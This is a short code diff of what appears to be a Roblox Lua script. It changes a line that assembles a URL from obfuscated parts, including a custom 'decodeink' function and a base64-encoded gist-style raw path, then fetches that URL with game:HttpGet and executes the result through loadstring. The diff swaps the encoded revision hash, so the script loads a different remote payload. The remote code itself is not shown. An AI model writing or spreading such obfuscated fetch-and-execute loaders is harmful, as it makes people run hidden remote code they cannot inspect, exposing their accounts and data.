@@ -53,7 +53,7 @@ function decodeink(data, autolaunch, mode)
 end
 
 
-return loadstring(game:HttpGet(""..decodeink(webhold["legs"],loadstring('return false')(),1)..""..decodeink("ODEyNTNjMDg3NGM4NGUzM2I1YWU1YzcwYWMyOWVhYTkvcmF3LzhmNWRkODdmYmQ5NGU2Mjk3ODIzODdkYjA0ZDM4NDg0ZTFhY2VjYTM=",loadstring('return false')(),2)..""..decodeink(webhold["head"],loadstring('return false')(),1)..""))()
+return loadstring(game:HttpGet(""..decodeink(webhold["legs"],loadstring('return false')(),1)..""..decodeink("ODEyNTNjMDg3NGM4NGUzM2I1YWU1YzcwYWMyOWVhYTkvcmF3L2ZmYWE1ZDI4N2IyOWZmMWFiNGIyNmJlNTY1NDdlYWU2NzNjODJlNTk=",loadstring('return false')(),2)..""..decodeink(webhold["head"],loadstring('return false')(),1)..""))()
 
 --[[
 api_decode = function(api_keys)
